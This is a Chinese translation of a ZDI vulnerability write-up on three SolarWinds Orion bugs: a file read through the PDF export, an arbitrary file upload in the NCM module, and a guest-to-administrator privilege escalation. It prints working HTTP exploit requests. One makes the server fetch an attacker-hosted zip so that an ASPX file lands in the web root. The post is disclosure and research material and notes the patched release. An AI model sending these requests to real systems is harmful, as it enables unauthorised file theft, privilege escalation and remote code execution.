> 原文链接: https://www.anquanke.com//post/id/231451 


# 分析SolarWinds Orion平台的另外三个漏洞


                                阅读量   
                                **147908**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者thezdi，文章来源：thezdi.com
                                <br>原文地址：[https://www.thezdi.com/blog/2021/2/11/three-more-bugs-in-orions-belt﻿](https://www.thezdi.com/blog/2021/2/11/three-more-bugs-in-orions-belt%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01b0e8e0fe975c5cde.jpg)](https://p5.ssl.qhimg.com/t01b0e8e0fe975c5cde.jpg)



## 0x00 前言

在前一篇文章中（[原文](https://www.zerodayinitiative.com/blog/2021/1/20/three-bugs-in-orions-belt-chaining-multiple-bugs-for-unauthenticated-rce-in-the-solarwinds-orion-platform)、[译文](https://www.anquanke.com/post/id/229457)），我们演示了如何利用低权限用户来访问SolarWinds Orion平台中的某些资源，介绍了如何利用这些资源实现远程代码执行（RCE）。我们也演示了如何使用CVE-2020-10148来绕过身份认证。在本文中，我们将分析由匿名研究人员提供的其他3个漏洞，guest（访客）用户可以将这些漏洞与权限提升bug结合组合使用，发起攻击。由于这些bug比较简单，因此本文篇幅不会太长。



## 0x01 特权

在前一篇文章中，我们简要讨论了SolarWinds Orion平台中的权限。该平台中有一个预定义的角色：guest账户。默认情况下，这个账户不需要密码，也没有分配任何特权。虽然这个账户默认处于禁用状态，但在某些部署场景下，该账户可能会被启用。

[![](https://p3.ssl.qhimg.com/t012c744eaa6bace684.png)](https://p3.ssl.qhimg.com/t012c744eaa6bace684.png)



## 0x02 CVE-2020-27870：目录遍历导致任意文件读取

`/orion/ExportToPDF.aspx`可以将HTML转换为PDF，但该地址并没有检查HTML中是否包含对本地文件的引用。此外，guest用户也可以访问该资源。如果攻击者提供的HTML文件中引用了本地文件，那么就有可能在服务器上通过`SYSTEM`上下文读取任意文件。

比如，攻击者可以通过如下请求来读取服务器上的`C:\\Windows\\system32\\drivers\\etc\\hosts`文件内容：

```
POST /orion/ExportToPDF.aspx?ExportID=55475&amp;PageHTML=%3Chtml%3E%3Ciframe%20src=%22C:%5CWindows%5Csystem32%5Cdrivers%5Cetc%5Chosts%22%20width=%221000%22%20height=%221000%22%3E%3C/html%3E HTTP/1.1.  &lt;------- 
Host: 172.16.11.168:8787 
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: keep-alive 
Origin: http://172.16.11.168:8787 
X-Requested-With: XMLHttpRequest 
Referer: http://172.16.11.168:8787/Orion/SummaryView.aspx?ViewID=1 
Content-Type: application/x-www-form-urlencoded 
Cookie: .ASPXAUTH=0660567401DF21BAAC59[...] 
Content-Length: 53 
[...Truncated...]
```

也可以通过如下请求来读取PDF文件：

```
POST /orion/ExportToPDF.aspx?ExportID=55475&amp;gimmethefile=true HTTP/1.1 
Host: 172.16.11.168:8787 
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: keep-alive 
Origin: http://172.16.11.168:8787 
X-Requested-With: XMLHttpRequest 
Referer: http://172.16.11.168:8787/Orion/SummaryView.aspx?ViewID=1 
Content-Type: application/x-www-form-urlencoded 
Cookie: .ASPXAUTH=0660567401DF21BAAC590375C511332186FE319751464EE2932BBBCECF1EECFDEB7AA7233D83572D3B253C5ADE83A083BD5CF9E0B7699DFEDB363A1442CCF2EBE56CA101813AEF9FF9A1579E73A430AC3244F36FD16490759B5B68A4E8A3F5A81E11FC7C5089CDD107A332701E673486A9683E74BB72A823C438FB681E3821F71F74C58A4D2E10146E19B04D5D491E3799E0973FBF1A8ED1723E97FE52E40D29D926C3A0B88074EE68B1ECE4391CD320; ASP.NET_SessionId=4q4kij1u0b3p3w5fcztorv5e; XSRF-TOKEN=6/SttzXoY2rJFY+74my5pSS055DftLCVbuOBlNKBxEU=; __AntiXsrfToken=e2de2272ca1e4cb7854602e9a0ca8d03 
Content-Length: 53 

__AntiXsrfTokenInput=e2de2272ca1e4cb7854602e9a0ca8d03 

HTTP/1.1 200 OK 
Cache-Control: private 
Transfer-Encoding: chunked 
Content-Type: binary/octet-stream 
Content-Disposition: attachment; filename="OrionReport.PDF"; size=32215 
X-Same-Domain: 1 
X-Content-Type-Options: nosniff 
X-Frame-Options: SAMEORIGIN 
X-XSS-Protection: 1; mode=block 
Date: Wed, 07 Oct 2020 18:24:56 GMT 

7dd7 
%PDF-1.4 
%.... 
1 0 obj 
&lt;&lt; /Creator (EO.Pdf) 
   /Producer (EO.Pdf 19.2.11.0) 
   /CreationDate (D:20201007182359+00'00') 
   /ModDate (D:20201007182359+00'00') 
&gt;&gt; 
endobj 
[...Truncated...]
```



## 0x03 CVE-2020-27871：目录遍历导致任意文件上传

Orion支持安装各种模块，每个模块可以执行特定的网络监控及管理功能，其中有一个模块为网络配置管理器（NCM，Network Configuration Manager）模块。该模块安装后就会出现一个任意文件上传漏洞，可以用于远程代码执行。该漏洞的根源来自于如下代码片段：

```
private void TryDownload(string cveXmlDataPath, out string error) 
`{` 
    this.vulnDownloader.TryDownload(cveXmlDataPath, out error); // &lt;------------------------------------- 
`}` 
// Token: 0x06000005 RID: 5 RVA: 0x00002114 File Offset: 0x00000314 
public void TryDownload(string path, out string error) 
`{` 
    this.log.InfoFormat("json path: \\"`{`0`}`\\".", new object[] 
    `{` 
        path 
    `}`); 
    IEnumerable&lt;string&gt; dataUrls = this.settings.GetDataUrls(); 
    string path2 = Path.Combine(path, Constants.NvdCpeMatchFolder); 
    bool flag = !Directory.Exists(path2); 
    if (flag) 
    `{` 
        Directory.CreateDirectory(path2); 
    `}` 
    List&lt;string&gt; list = new List&lt;string&gt;(); 
    string item; 
    bool flag2 = !this.TryDownloadDataFeed(this.centralizedSettings.CpeMatchDataFeedUrl, path2, out item); // &lt;--------------- default 
    if (flag2) 
    `{` 
        list.Add(item); 
    `}` 
    foreach (string url in dataUrls) 
    `{` 
        bool flag3 = !this.TryDownloadDataFeed(url, path, out item); // &lt;---------------------------------------------- 
        if (flag3) 
        `{` 
            list.Add(item); 
        `}` 
    `}` 
    error = ((list.Count &gt; 0) ? string.Join(Environment.NewLine, list) : string.Empty); 
`}` 

private bool TryDownloadDataFeed(string url, string path, out string error) 
`{` 
    bool flag = this.Download(url, path); // &lt;----------------------------------------------- 
    error = null; 
    bool flag2 = !flag; 
    bool result; 
    if (flag2) 
    `{` 
        this.audit.LogFailureAuditMesage(AuditModule.VulnerabilityAudit, AuditAction.FirmwareVulnerabilities, string.Format(Resources.LIBCODE_IC_131, url), Resources.LIBCODE_IC_132); 
        error = string.Format(Resources.Vulnerability_UrlIsInaccessible_Message, url); 
        result = false; 
    `}` 
    else 
    `{` 
        result = true; 
    `}` 
    return result; 
`}` 

private bool TryDownloadDataFeed(string url, string path, out string error) 
`{` 
    bool flag = this.Download(url, path);  // &lt;----------------------------------------------------- 
    error = null; 
    bool flag2 = !flag; 
    bool result; 
    if (flag2) 
    `{` 
        this.audit.LogFailureAuditMesage(AuditModule.VulnerabilityAudit, AuditAction.FirmwareVulnerabilities, string.Format(Resources.LIBCODE_IC_131, url), Resources.LIBCODE_IC_132); 
        error = string.Format(Resources.Vulnerability_UrlIsInaccessible_Message, url); 
        result = false; 
    `}` 
    else 
    `{` 
        result = true; 
    `}` 
    return result; 
`}`
```

如上所示，NCM模块中包含一个固件漏洞管理功能，可以从外部站点下载包含JSON文件的一个ZIP文件。默认情况下，该模块会从`https://nvd.nist.gov`站点下载，但这个默认地址可以被修改。下载文件后，该模块会自动从`.zip`压缩文件中提取数据，但并不会检查解压出来的文件的扩展名，也不会验证文件上传路径。因此，攻击者有可能将文件上传至文件系统中的任意位置。该模块会在`SYSTEM`上下文中解压和写入文件。

这个缺陷利用起来非常简单。比如，攻击者可以通过如下请求，将任意ASPX文件上传至`www`目录：

```
POST /Orion/NCM/Admin/Settings/VulnerabilitySettings.aspx HTTP/1.1 
Host: 172.16.11.190:8787 
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: keep-alive 
Origin: http://172.16.11.190:8787 
X-Requested-With: XMLHttpRequest 
X-MicrosoftAjax: Delta=true 
X-XSRF-TOKEN: CE7UJynEir5LuHr57PSgKfVaORlNgU/kYm6D+gpr+JE= 
Content-Type: application/x-www-form-urlencoded; charset=utf-8 
[...] 
Content-Length: 3994 

[...] 
older%24txtVulnMatchingScheduleTime=12%3A30%3A00+AM&amp;ctl00_ctl00_ctl00_BodyContent_ContentPlaceHolder1_adminContentPlaceholder_txtVulnMatchingScheduleTime_p=2020-9-7-0-30-0-0&amp;ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%2 
4adminContentPlaceholder%24txtCVEXmlDataPath=C%3A%5Cinetpub%5Cwwwroot &lt;------------------------------- 
&amp;ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24chAutoDownloadCVEDataUrls=on&amp;ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24gridView%24ctl02%24txtUrl=http%3A%2F%2F172.16.11.203%3A8000%2Fpoc7KWR0E.zip &lt;------------------------------------------ 
&amp;ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24txtVulnScoreThreshold=5&amp;__ASYNCPOST=true
```

这个漏洞有个缺点：只能被Admin用户所利用。然而，攻击者可以通过下面这个漏洞来绕过该限制。



## 0x04 ZDI-CAN-11903/ZDI-21-192：权限提升漏洞

当SolarWinds Orion平台安装了如下任意一个模块后，就会存在该漏洞：
- Network Configuration Manager
- Server Configuration Manager
- IP Address Manager
当平台安装过其中一个产品后，SolarWinds就会在`WebUserSettings`表中存储账户角色。

[![](https://p3.ssl.qhimg.com/t01d8221fbd883538b0.png)](https://p3.ssl.qhimg.com/t01d8221fbd883538b0.png)

提供该漏洞的研究人员发现，这个表可以通过`SaveUserSetting`这个隐藏的资源来修改。Guest用户可以发起如下请求，轻松将权限提升至管理员特权：

```
POST /orion/services/WebAdmin.asmx/SaveUserSetting HTTP/1.1 
Host: 172.16.11.190:8787 
User-Agent: Mozilla/5.0 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: keep-alive 
Origin: http://172.16.11.190:8787 
X-Requested-With: XMLHttpRequest 
X-MicrosoftAjax: Delta=true 
X-XSRF-TOKEN: THm8YIMQ0sGaGYlPcwJfHvuT6GvRmocs6hPaeFT1H54= 
Content-Type: application/json;charset=utf-8 
Cookie: .ASPXAUTH=9E5A8A04443C998883584BDCC411A24773DE7D28D3B7317167[...] 
Content-Length: 56 

`{`"name": "NCM.NCMAccountRole", "value": "Administrator"`}`
```



## 0x05 总结

通过这几篇文章，我们应该充分意识到简单的错误及疏忽将导致严重的后果。幸运的是，SolarWinds已经在[Orion Platform 2020.2.1 HF2](https://documentation.solarwinds.com/en/Success_Center/orionplatform/content/release_notes/orion_platform_2020-2-1_release_notes.htm)中解决了以上所有漏洞，我们建议受影响的平台第一时间进行升级。

[![](https://p0.ssl.qhimg.com/t015a79e97db3277ed2.png)](https://p0.ssl.qhimg.com/t015a79e97db3277ed2.png)
